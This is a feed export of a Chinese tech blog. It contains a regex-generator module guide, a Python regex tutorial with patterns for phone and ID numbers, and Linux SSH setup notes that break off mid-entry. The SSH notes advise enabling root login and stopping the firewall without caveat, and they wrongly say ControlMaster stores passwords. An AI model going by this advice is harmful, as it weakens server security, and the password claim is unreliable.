<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nMask&#39;s Blog</title>
  <subtitle>那一年，风陵渡口.......</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://thief.one/"/>
  <updated>2017-11-07T12:16:47.000Z</updated>
  <id>http://thief.one/</id>
  
  <author>
    <name>nMask</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自动生成正则大法暨CreateRe模块使用说明</title>
    <link href="http://thief.one/2017/11/07/1/"/>
    <id>http://thief.one/2017/11/07/1/</id>
    <published>2017-11-07T12:06:46.000Z</published>
    <updated>2017-11-07T12:16:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">妈妈再也不用担心我的正则啦!</blockquote><br>　　老早以前就想写个自动生成正则表达式的Python模块出来，但思前想后也没有一个很好的技术方案。今晨突然灵光一闪，一气呵成下写了个CreateRe模块。说实话生成正则的能力一般，此模块能生成简单的正则表达式，适合初学者，可供压根不懂正则表达式也不想学正则的有为青年使用，简单方便一键生成。<br><a id="more"></a></p>
<h3 id="CreateRe模块介绍"><a href="#CreateRe模块介绍" class="headerlink" title="CreateRe模块介绍"></a>CreateRe模块介绍</h3><p>　　Python生成正则表达式模块，此模块用来逆向的生成正则表达式。只需要传入待匹配的字符串，以及预期想要匹配出的结果列表，即可以生成一个正则表达式。<br>　　当然目前模块还不够成熟，具体表现在：第一生成能力有限（复杂的可能生成不了），第二是生成的正则表达式不够简便（我们知道同一个匹配效果，可以有很多种正则表达式去实现，高手往往能写出最短最优化的正则，而此模块尚处于入门阶段），只适合正则初学者使用。</p>
<h3 id="CreateRe模块使用"><a href="#CreateRe模块使用" class="headerlink" title="CreateRe模块使用"></a>CreateRe模块使用</h3><h4 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/tengzhangchao/CreateRe.git</div></pre></td></tr></table></figure>
<h4 id="Import-Module导入模块"><a href="#Import-Module导入模块" class="headerlink" title="Import Module导入模块"></a>Import Module导入模块</h4><p>导入CreateRe模块，使用实例，可参考项目中的test.py文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from CreateRe import create_re</div></pre></td></tr></table></figure></p>
<h4 id="生成正则表达式"><a href="#生成正则表达式" class="headerlink" title="生成正则表达式"></a>生成正则表达式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 待匹配的字符串</span></div><div class="line">STRING = u<span class="string">""</span></div><div class="line"></div><div class="line"><span class="comment"># 预想匹配结果列表</span></div><div class="line">S = [<span class="string">""</span>]</div><div class="line"></div><div class="line">cur=create_re() <span class="comment">#实例化类</span></div><div class="line">RES=cur.run(STRING,S,tag=True) <span class="comment">#生成正则表达式</span></div><div class="line">check_result=cur.check_res(RES,tag=True) <span class="comment">#Check正则表达式,返回匹配后的结果</span></div></pre></td></tr></table></figure>
<h4 id="run函数参数说明"><a href="#run函数参数说明" class="headerlink" title="run函数参数说明"></a>run函数参数说明</h4><ul>
<li>STRING 待匹配的字符串，必须为unicode格式</li>
<li>S 预想正则匹配结果列表，必须为List，且如果List中有中文选项，则需要为unicode格式</li>
<li>tag 贪婪匹配的开关，具体区别下面会介绍</li>
</ul>
<h4 id="演示说明"><a href="#演示说明" class="headerlink" title="演示说明"></a>演示说明</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">STRING = u<span class="string">''</span><span class="string">'</span></div><div class="line">http://thief.one nmask</div><div class="line">http://tool.nmask.cn nm4k</div><div class="line">http://home.nmask.cn nmask</div><div class="line">'<span class="string">''</span></div><div class="line"></div><div class="line">S = [<span class="string">"http://tool.nmask.cn"</span>]</div><div class="line"></div><div class="line">tag=False</div><div class="line">cur=create_re()</div><div class="line">RES=cur.run(STRING,S,tag=tag)</div><div class="line">check_result=cur.check_res(RES,tag=tag)</div><div class="line"><span class="built_in">print</span> RES</div><div class="line"><span class="built_in">print</span> check_result</div></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;\.[a-z]&#123;5&#125;\.[a-z][a-z]) nm4</div><div class="line">[u<span class="string">'http://tool.nmask.cn'</span>]</div></pre></td></tr></table></figure></p>
<p>当改变tag的值，tag=True，运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;\.[a-z]&#123;5&#125;\.[a-z][a-z])</div><div class="line">[u<span class="string">'http://tool.nmask.cn'</span>, u<span class="string">'http://home.nmask.cn'</span>]</div></pre></td></tr></table></figure></p>
<p>说明：tag=True表示开启贪婪匹配，即生成的正则将会尽可能多的匹配出结果，缺省为False。</p>
<p>S的值也可以指定多个:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">STRING = u<span class="string">''</span><span class="string">'</span></div><div class="line">http://thief.one nmask</div><div class="line">http://tool.nmask.cn nm4k</div><div class="line">http://home.nmask.cn nmask</div><div class="line">'<span class="string">''</span></div><div class="line"></div><div class="line">S = [<span class="string">"http://tool.nmask.cn"</span>,<span class="string">"http://thief.one"</span>]</div><div class="line"></div><div class="line">tag=True</div><div class="line">cur=create_re()</div><div class="line">RES=cur.run(STRING,S,tag=tag)</div><div class="line">check_result=cur.check_res(RES,tag=tag)</div><div class="line"><span class="built_in">print</span> RES</div><div class="line"><span class="built_in">print</span> check_res</div></pre></td></tr></table></figure></p>
<p>运行结果:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;(?:.?)&#123;2&#125;[a-z]&#123;3&#125;(?:.?)&#123;4&#125;) </div><div class="line">[u<span class="string">'http://thief.one'</span>, u<span class="string">'http://tool.nmask.cn'</span>, u<span class="string">'http://home.nmask.cn'</span>]</div></pre></td></tr></table></figure></p>
<p>如果将tag改为False，则结果为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;(?:.?)&#123;2&#125;[a-z]&#123;3&#125;(?:.?)&#123;4&#125;) </div><div class="line">False</div></pre></td></tr></table></figure></p>
<p>返回check_res=False表示生成的正则表达式，并不能匹配出想要的结果；可以将tag改为True尝试。</p>
<h4 id="获取模块内置的正则表达式"><a href="#获取模块内置的正则表达式" class="headerlink" title="获取模块内置的正则表达式"></a>获取模块内置的正则表达式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cur=create_re()</div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"email"</span>) <span class="comment">#邮箱</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"phone"</span>) <span class="comment">#电话</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"name"</span>) <span class="comment">#姓名</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"id_15"</span>) <span class="comment">#身份证 15位</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"id_18"</span>) <span class="comment">#身份证 18位</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"car_id"</span>) <span class="comment">#车牌</span></div><div class="line"><span class="built_in">print</span> cur.get_res(<span class="string">"address"</span>) <span class="comment">#家庭住址</span></div></pre></td></tr></table></figure>
<h4 id="模块返回值"><a href="#模块返回值" class="headerlink" title="模块返回值"></a>模块返回值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tag=True</div><div class="line">cur=create_re()</div><div class="line">RES=cur.run(STRING,S,tag=tag)</div><div class="line">check_result=cur.check_res(RES,tag=tag)</div></pre></td></tr></table></figure>
<ul>
<li>RES 模块生成的正则表达式</li>
<li>check_result 利用正则表达式生成结果与预期相比较，若返回False则表示失败，返回结果列表则表示成功</li>
</ul>
<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="https://github.com/tengzhangchao/CreateRe" target="_blank" rel="external">https://github.com/tengzhangchao/CreateRe</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;妈妈再也不用担心我的正则啦!&lt;/blockquote&gt;&lt;br&gt;　　老早以前就想写个自动生成正则表达式的Python模块出来，但思前想后也没有一个很好的技术方案。今晨突然灵光一闪，一气呵成下写了个CreateRe模块。说实话生成正则的能力一般，此模块能生成简单的正则表达式，适合初学者，可供压根不懂正则表达式也不想学正则的有为青年使用，简单方便一键生成。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="正则" scheme="http://thief.one/tags/%E6%AD%A3%E5%88%99/"/>
    
      <category term="CreateRe" scheme="http://thief.one/tags/CreateRe/"/>
    
  </entry>
  
  <entry>
    <title>nmask&#39;tool框架开源说明</title>
    <link href="http://thief.one/2017/11/02/1/"/>
    <id>http://thief.one/2017/11/02/1/</id>
    <published>2017-11-02T04:40:15.000Z</published>
    <updated>2017-11-02T04:56:52.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">这是一篇内容很短的文章</blockquote><br>　　事情的起因是有热心网友问起<a href="http://tool.nmask.cn" target="_blank" rel="external">nmask’tool</a>网站框架源码是否能够开源？本着分享的精神，我自然是很乐意开源的。只不过目前代码还没有梳理得很完善，扩展起来可能会比较麻烦，后期有时间我会把框架完善一下。关于此项目的任何进展，都会在本篇更新，尽情期待！<br><a id="more"></a><br>　　当然其实这也谈不上是框架，无非是自己用Django写的一个小应用，当初没有考虑太多扩展的东西。如果大家觉得看着还行，可以去github上clone一份代码，自己搭建起来玩玩。当然我更希望大家能一起来完善这个工具平台（暂且称之为平台），多多贡献功能插件。<br>　　我当初开发这个工具平台的初衷是整合一些已有的功能，以web的形式免费向大家提供服务，避免重复造轮子。此工具平台主要侧重于安全类的功能开发，当然目前来看还是开发类的功能比较多，这也是因为我最近工作繁忙，还没来得及去更新安全类的一些功能。</p>
<p>项目GITHUB地址：<a href="https://github.com/tengzhangchao/tool-nmask" target="_blank" rel="external">https://github.com/tengzhangchao/tool-nmask</a></p>
<p>说明：关于如何进行功能扩展？我后期会整理一份开发文档，目前大家可以先自行研究研究代码。有任何项目上的问题，可以开issues提问，或者进<a href="http://home.nmask.cn" target="_blank" rel="external">群</a>交流，也可以发送邮件，当然最方便的就是在文章下方留言啦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;这是一篇内容很短的文章&lt;/blockquote&gt;&lt;br&gt;　　事情的起因是有热心网友问起&lt;a href=&quot;http://tool.nmask.cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;nmask’tool&lt;/a&gt;网站框架源码是否能够开源？本着分享的精神，我自然是很乐意开源的。只不过目前代码还没有梳理得很完善，扩展起来可能会比较麻烦，后期有时间我会把框架完善一下。关于此项目的任何进展，都会在本篇更新，尽情期待！&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="nmask&#39;tool" scheme="http://thief.one/tags/nmask-tool/"/>
    
  </entry>
  
  <entry>
    <title>Python 正则表达式</title>
    <link href="http://thief.one/2017/10/30/1/"/>
    <id>http://thief.one/2017/10/30/1/</id>
    <published>2017-10-30T11:43:54.000Z</published>
    <updated>2017-10-31T05:37:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">悄悄问圣僧，女儿美不美</blockquote><br>　　好久没有更新文章啦，主要是实在不知道写点啥。最近忙着搞安全开发，很多知识的学习都暂时停滞了，因此也没啥新知识可以分享的。想起之前一直有人问我怎么写正则表达式，我就在本篇结合Python语言，总结下正则表达式到底该怎么写吧。<br><a id="more"></a></p>
<h3 id="正则规则"><a href="#正则规则" class="headerlink" title="正则规则"></a>正则规则</h3><p>想要写好正则表达式，就先学习下它的规则吧！<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[]:指定一个字符集,<span class="string">'[abc\s\d]'</span>中，a,b,c任意一个满足便可以。</div><div class="line">&#123;&#125;:重复,a&#123;8&#125;=aaaaaaaa;b&#123;1,3&#125;:重复1-3次。</div><div class="line">^:匹配行首,<span class="string">'[^abc]'</span>中，除了a,b,c，其他的都可以;<span class="string">'^hello'</span>表示行首是hello的字符串。</div><div class="line">$:匹配行尾,<span class="string">'boy$'</span>表示行尾是boy的字符串。</div><div class="line"></div><div class="line">\:转义字符</div><div class="line">\d:[0-9]</div><div class="line">\w:[a-zA-Z0-9_]</div><div class="line">\s:空格或者tab或者换行，也包括\r\n</div><div class="line"></div><div class="line">*:指定前一个字符匹配0次或多次。<span class="string">'ab*'</span>,可以匹配a，ab，abb，abbbb等。</div><div class="line">+:指定前一个字符匹配1次或多次。</div><div class="line">?:指定前一个字符匹配0次或1次，加载重复后面可以最小匹配。</div><div class="line">.:表示任意字符（换行符\n除外re.DOTALL可以匹配所有字符串，包括换行；re.compile(r<span class="string">".*"</span>,re.DOTALL)</div><div class="line"></div><div class="line">(?i)：在正则表达式前面加上这个，便可以忽略大小写;如:res=r<span class="string">"(?i)[abc]"</span></div><div class="line">(asp|php|jsp)：表示或者，跟[abc]的区别在于它是匹配一个字符串，而[]只是单个字符。</div><div class="line">r<span class="string">'((?[\d]*)&#123;2,3&#125;)'</span>:在内括号前加上?:,结果只匹配外面括号的内容。</div></pre></td></tr></table></figure></p>
<h3 id="Python中使用正则"><a href="#Python中使用正则" class="headerlink" title="Python中使用正则"></a>Python中使用正则</h3><p>我们知道正则并不是python特有的，很多编程语言都有正则。而在Python中想要使用正则，需要借助re模块。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 导入模块</span></div><div class="line">import re</div><div class="line"></div><div class="line">res=r<span class="string">"[\d]&#123;2&#125;"</span> <span class="comment">#正则表达式</span></div><div class="line">content=<span class="string">"abcd12345678abcd"</span> <span class="comment">#待匹配的内容</span></div><div class="line"></div><div class="line"><span class="comment"># 直接匹配</span></div><div class="line">a=re.search(res,content)               </div><div class="line"><span class="keyword">if</span> a:</div><div class="line">    <span class="built_in">print</span> a.group()</div><div class="line"></div><div class="line"><span class="comment"># 编译 （加快匹配速度）</span></div><div class="line">p_tel=re.compile(res)               将正则表达式编译，提高运行速度。</div><div class="line">p_tel.findall(content)       找到RE匹配的所有子串，并作为列表返回。</div><div class="line">p_tel.match(content)             决定RE是否在字符串刚开始的位置匹配。</div><div class="line">p_tel.search(content)            扫描字符串，找到这个RE匹配的位置。</div><div class="line">p_tel.group(num=0)                  返回全部匹配对象。（或指定编号是num的子组）</div><div class="line">p_tel.sub(pattern,string)           对正则表达式中所有匹配string的用pattern替换。</div><div class="line">p_tel.split(pattern，string) 根据正则表达式pattern中的分隔符把字符string分隔为一个列表。</div></pre></td></tr></table></figure></p>
<h3 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h3><p>需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。<br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; re.match(r<span class="string">'^(\d+)(0*)$'</span>, <span class="string">'123400'</span>).groups()</div><div class="line">(<span class="string">'123400'</span>, <span class="string">''</span>)</div></pre></td></tr></table></figure></p>
<p>说明：由于\d+采用贪婪匹配，直接把后面的0全部匹配了，结果0*只能匹配空字符串了。必须让\d+采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个?就可以让\d+采用非贪婪匹配：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; re.match(r<span class="string">'^(\d+?)(0*)$'</span>, <span class="string">'123400'</span>).groups()</div><div class="line">(<span class="string">'1234'</span>, <span class="string">'00'</span>)</div></pre></td></tr></table></figure></p>
<h3 id="正则实例"><a href="#正则实例" class="headerlink" title="正则实例"></a>正则实例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">匹配IP地址的正则表达式 res=/(\d+)\.(\d+)\.(\d+)\.(\d+)/g</div><div class="line">匹配空行的正则表达式：res=\n[\s| ]*\r</div><div class="line">匹配HTML标记的正则表达式：res=/&lt;(.*)&gt;.*&lt;\/\1&gt;|&lt;(.*) \/&gt;/</div><div class="line">匹配首尾空格的正则表达式：res=(^\s*)|(\s*$)</div><div class="line">匹配中文字符的正则表达式： res=[\u4e00-\u9fa5] <span class="comment">#python中需要转换为unicode</span></div><div class="line">匹配双字节字符(包括汉字在内)：res=[^\x00-\xff]</div><div class="line"></div><div class="line">user_phone=r<span class="string">"((?:13[0-9]|14[579]|15[0-3,5-9]|17[0135678]|18[0-9])\d&#123;8&#125;)"</span></div><div class="line">user_name=r<span class="string">""</span>+u<span class="string">"([\u4e00-\u9fa5\·]&#123;2,3&#125;)"</span></div><div class="line">user_id_18=r<span class="string">"([1-9]\d&#123;5&#125;(?:1[9,8]\d&#123;2&#125;|20[0,1]\d)(?:0[1-9]|1[0-2])(?:0[1-9]|1[0-9]|2[0-9]|3[0,1])\d&#123;3&#125;[\dxX])"</span>   </div><div class="line">user_id_15=r<span class="string">"([1-9]\d&#123;7&#125;(?:0[1-9]|1[0-2])(?:0[1-9]|1[0-9]|2[0-9]|3[0,1])\d&#123;2&#125;[\dxX])"</span></div><div class="line">car_id=r<span class="string">""</span>+u<span class="string">"([京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领]&#123;1&#125;[A-Z]&#123;1&#125;[A-Z0-9]&#123;4&#125;[A-Z0-9挂学警港澳]&#123;1&#125;)"</span></div><div class="line">email=r<span class="string">"([a-z_0-9.-]&#123;2,64&#125;@[a-z0-9-]&#123;2,200&#125;\.[a-z]&#123;2,6&#125;)"</span></div><div class="line">address=r<span class="string">""</span>+u<span class="string">"([\u4e00-\u9fa5\·]&#123;6,20&#125;)"</span></div><div class="line"></div><div class="line">Python中针对 unicode正则写法：</div><div class="line">res=ur<span class="string">"[\u4e00-\u9fa5]"</span></div></pre></td></tr></table></figure>
<h3 id="正则平台"><a href="#正则平台" class="headerlink" title="正则平台"></a>正则平台</h3><p>建议在代码中使用正则前，先测试下正则的质量。为了方便使用，我自己写了一个在线工具，需要的可以用用：<a href="http://tool.nmask.cn/python_re/" target="_blank" rel="external">http://tool.nmask.cn/python_re/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;悄悄问圣僧，女儿美不美&lt;/blockquote&gt;&lt;br&gt;　　好久没有更新文章啦，主要是实在不知道写点啥。最近忙着搞安全开发，很多知识的学习都暂时停滞了，因此也没啥新知识可以分享的。想起之前一直有人问我怎么写正则表达式，我就在本篇结合Python语言，总结下正则表达式到底该怎么写吧。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="正则表达式" scheme="http://thief.one/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>ssh、telnet、ftp安装使用小记</title>
    <link href="http://thief.one/2017/10/11/1/"/>
    <id>http://thief.one/2017/10/11/1/</id>
    <published>2017-10-11T02:52:25.000Z</published>
    <updated>2017-10-11T03:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">爱你的每个瞬间像飞驰而过的地铁</blockquote><br>　　ssh、telnet、ftp相信大家都很熟悉，它们是linux中最常用的几个服务。一般linux系统缺省是安装了ssh、ftp、telnet的，但也有些情况是没有安装的。本篇主要记录如何在linux上搭建这几个服务，并简单记录对应服务的客户端使用方法。<br><a id="more"></a></p>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h4 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h4><p>查看ssh服务是否已经安装:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;rpm -qa | grep ssh</div></pre></td></tr></table></figure></p>
<p>若已经安装，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">libssh2-1.4.3-10.el7_2.1.x86_64</div><div class="line">openssh-7.4p1-12.el7_4.x86_64</div><div class="line">openssh-clients-7.4p1-12.el7_4.x86_64</div><div class="line">openssh-server-7.4p1-12.el7_4.x86_64</div></pre></td></tr></table></figure></p>
<p>若没有安装，则安装openssh服务端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-server <span class="comment">#ubuntu</span></div><div class="line">yum -y install openssh-server  <span class="comment">#centos</span></div></pre></td></tr></table></figure></p>
<p>开启关闭ssh服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">service sshd(ssh) start</div><div class="line">service sshd(ssh) stop</div><div class="line">service sshd(ssh) restart</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/sshd start</div><div class="line">/etc/init.d/sshd stop</div><div class="line">/etc/init.d/sshd restart</div></pre></td></tr></table></figure></p>
<p>centos7:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/bin/systemctl start sshd.service</div><div class="line">/bin/systemctl stop sshd.service</div><div class="line">/bin/systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
<p>MAC开启ssh服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo systemsetup -getremotelogin <span class="comment">#判断状态</span></div><div class="line">sudo systemsetup -setremotelogin on <span class="comment">#开启ssh</span></div><div class="line">sudo systemsetup -setremotelogin off <span class="comment">#关闭ssh</span></div></pre></td></tr></table></figure></p>
<h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><p>ssh配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>使root用户能够ssh，注释掉 #PermitRootLogin without-password，添加 PermitRootLogin yes。更多配置信息，可参考：<a href="http://blog.csdn.net/zhu_xun/article/details/18304441" target="_blank" rel="external">http://blog.csdn.net/zhu_xun/article/details/18304441</a></p>
<p>关闭防火墙：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/iptables stop</div></pre></td></tr></table></figure></p>
<p>开机自启动设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update-rc.d ssh <span class="built_in">enable</span></div></pre></td></tr></table></figure></p>
<p>关闭开机自启动：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update-rc.d ssh <span class="built_in">disable</span></div></pre></td></tr></table></figure></p>
<p>说明：以上改动配置文件，需要重启生效。</p>
<h4 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h4><p>缺省linux是安装了客户端的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install openssh-client <span class="comment">#ubuntu</span></div><div class="line">yum install openssh-clients <span class="comment">#centos</span></div></pre></td></tr></table></figure></p>
<h4 id="客户端使用"><a href="#客户端使用" class="headerlink" title="客户端使用"></a>客户端使用</h4><h5 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;ssh root@10.0.0.1 <span class="comment">#用密码登录</span></div><div class="line">&gt;&gt;ssh -i ~/.ssh/<span class="built_in">test</span> 10.0.0.1 <span class="comment">#用密钥登陆</span></div></pre></td></tr></table></figure>
<h5 id="记住密码"><a href="#记住密码" class="headerlink" title="记住密码"></a>记住密码</h5><p>记住账号密码，不用每次都重新输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat .ssh/config（没有的话就去创建,vim）</div></pre></td></tr></table></figure></p>
<p>写入内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Host *</div><div class="line">     ControlMaster auto</div><div class="line">     ControlPath ~/.ssh/%h-%p-%r</div><div class="line">     ControlPersist yes</div></pre></td></tr></table></figure></p>
<p>这样每次登陆一个新的地址以后，.ssh/下都会生成一个配置文件，就会记录账号密码。</p>
<h5 id="文件移动"><a href="#文件移动" class="headerlink" title="文件移动"></a>文件移动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /localdirectory/example1.txt &lt;username&gt;@&lt;remote&gt;:&lt;path&gt;</div></pre></td></tr></table></figure>
<p>可以复制example1.txt 到远程电脑指定的<path></path> 。你也可以让<path></path>为空白，来复制远程电脑的根文件夹。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp &lt;username&gt;@&lt;remote&gt;:/home/example1.txt ./</div></pre></td></tr></table></figure>
<p>会把example1.txt从远程电脑的主目录移动到本地电脑的当前目录。</p>
<h5 id="ssh密钥对"><a href="#ssh密钥对" class="headerlink" title="ssh密钥对"></a>ssh密钥对</h5><p>客户端生成密钥对：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -f <span class="built_in">test</span> -C <span class="string">"test key"</span></div></pre></td></tr></table></figure></p>
<ul>
<li>-t 加密类型</li>
<li>-f 密钥文件名</li>
<li>-C 备注</li>
</ul>
<p>说明：执行命令会在.ssh（若没有可自行创建~/.ssh目录）目录下生成test、test.pub文件，test是私钥，test.pub是公钥。</p>
